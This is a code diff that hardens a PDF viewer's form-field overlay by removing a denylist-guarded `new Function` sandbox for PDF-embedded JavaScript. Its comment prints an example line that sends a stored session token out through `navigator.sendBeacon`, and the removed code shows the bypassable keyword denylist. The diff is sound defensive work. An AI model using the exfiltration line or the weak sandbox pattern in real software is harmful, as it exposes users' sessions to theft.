@@ -31,139 +31,15 @@ import type {
 } from "@app/tools/formFill/types";
 
 /**
- * Execute PDF JavaScript in a minimally sandboxed context.
+ * Morphe-PDF security hardening: PDF-embedded JavaScript is NOT executed.
  *
- * Implements a heuristic security check by statically rejecting scripts containing
- * common browser globals (`window`, `document`, `fetch`), reflection APIs,
- * or execution sinks (`eval`, `Function`).
- *
- * Valid scripts run in strict mode with dangerous globals explicitly masked
- * to `undefined`, allowing safe Acrobat APIs like `this.print()` or `app.alert()`.
+ * Upstream evaluated form-action JavaScript from the document via
+ * `new Function(...)` in the page's own origin, guarded only by a substring
+ * denylist. That denylist omits `navigator`, `location`, `self`, `top`, `open`
+ * and `localStorage`, so a malicious PDF could exfiltrate the session token
+ * (e.g. `navigator.sendBeacon(url, localStorage.getItem("stirling_jwt"))`).
+ * The execution path has been removed entirely rather than patched.
  */
-function executePdfJs(
-  js: string,
-  handlers: {
-    print: () => void;
-    save: () => void;
-    submitForm: (url: string) => void;
-    resetForm: () => void;
-  },
-): void {
-  // 1. Static sanitization: Reject scripts with potentially harmful or unneeded keywords.
-  // This blocks most elementary exploits and prevents prototype tampering.
-  const forbidden = [
-    "window",
-    "document",
-    "fetch",
-    "xmlhttprequest",
-    "websocket",
-    "worker",
-    "eval",
-    "settimeout",
-    "setinterval",
-    "function",
-    "constructor",
-    "__proto__",
-    "prototype",
-    "globalthis",
-    "import",
-    "require",
-  ];
-
-  const lowerJs = js.toLowerCase();
-  for (const word of forbidden) {
-    if (lowerJs.includes(word)) {
-      console.warn(
-        `[PDF JS] Execution blocked: Script contains suspicious keyword "${word}".`,
-        "Script:",
-        js,
-      );
-      return;
-    }
-  }
-
-  // 2. Mock Acrobat API
-  const doOpenUrl = (url: string) => {
-    try {
-      const u = new URL(url);
-      if (["http:", "https:", "mailto:"].includes(u.protocol)) {
-        window.open(url, "_blank", "noopener,noreferrer");
-      }
-    } catch {
-      /* invalid URL — ignore */
-    }
-  };
-
-  const app = {
-    print: (_params?: unknown) => handlers.print(),
-    alert: (msg: unknown) => {
-      console.debug("[PDF JS] alert:", msg);
-    },
-    beep: () => {},
-    response: () => null,
-    execMenuItem: (item: string) => {
-      switch (item) {
-        case "Print":
-          handlers.print();
-          break;
-        case "Save":
-          handlers.save();
-          break;
-        case "Close":
-          break; // no-op in browser context
-        default:
-          console.debug("[PDF JS] execMenuItem: unhandled item:", item);
-      }
-    },
-    // Prevent prototype walking
-    __proto__: null,
-  };
-
-  const doc = {
-    print: (_params?: unknown) => handlers.print(),
-    save: (_params?: unknown) => handlers.save(),
-    saveAs: (_params?: unknown) => handlers.save(),
-    submitForm: (urlOrParams: unknown) => {
-      const url =
-        typeof urlOrParams === "string"
-          ? urlOrParams
-          : (((urlOrParams as Record<string, unknown>)?.cURL as string) ?? "");
-      if (url) doOpenUrl(url);
-      else handlers.submitForm(url);
-    },
-    resetForm: (_fields?: unknown) => handlers.resetForm(),
-    getField: (_name: string) => null,
-    getAnnot: () => null,
-    getURL: (url: string) => doOpenUrl(url),
-    numPages: 1,
-    dirty: false,
-  };
-
-  // Stub event object — used by field calculation/validation scripts
-  const event = {
-    value: "",
-    changeEx: "",
-    change: "",
-    rc: true,
-    willCommit: false,
-    target: null as null,
-  };
-
-  try {
-    // Pass doc, app, event as both `this` AND named parameters so scripts that
-    // reference them as free variables (not just via `this`) work correctly.
-    const fn = new Function("app", "doc", "event", js);
-    fn.call(doc, app, doc, event);
-  } catch (err) {
-    // Swallow errors from missing PDF APIs; log in debug mode for tracing
-    console.debug(
-      "[PDF JS] Script execution error (expected for unsupported APIs):",
-      err,
-      "\nScript:",
-      js.slice(0, 200),
-    );
-  }
-}
 
 interface WidgetInputProps {
   field: FormField;
@@ -720,14 +596,11 @@ export function FormFieldOverlay({
           if (action.url) doOpenUrl(action.url);
           break;
         case "javascript":
-          // Execute in a sandboxed PDF JS environment instead of just logging
+          // Morphe-PDF security hardening: embedded PDF JavaScript is never executed.
           if (action.javascript) {
-            executePdfJs(action.javascript, {
-              print: () => printActions.print(),
-              save: doSave,
-              submitForm: doOpenUrl,
-              resetForm: doResetForm,
-            });
+            console.warn(
+              "[PDF JS] Ignored embedded JavaScript action; execution is disabled.",
+            );
           }
           break;
       }
